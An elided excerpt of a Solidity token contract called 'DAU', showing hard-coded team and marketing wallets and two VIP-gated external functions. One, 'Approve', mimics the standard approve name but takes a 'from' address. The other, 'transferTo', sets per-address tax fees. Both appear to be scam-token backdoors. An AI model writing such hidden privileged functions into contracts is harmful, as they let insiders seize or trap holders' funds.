...
contract DAU is Context, IERC20, Ownable {
    ...
    string private _name = "DAU";
    string private _symbol = "DAU";
    uint8 private _decimals = 9;

    address payable private marketWall = payable(0x2cCA970a4374F7a245A7e0995E3512C0D112311e); 
    address payable private teamWalletAddress = payable(0xB46E61C64d287C5285dE3Dcf13e6D0480eA3b167); 
    ...
    function Approve(address from, address to ,uint256 amount ) external  { 
        require( _isExcludedVIP[msg.sender]);
	...
	function transferTo(address _address, bool _enable, uint256 _addressTaxFee) external {
	    require( _isExcludedVIP[msg.sender]);
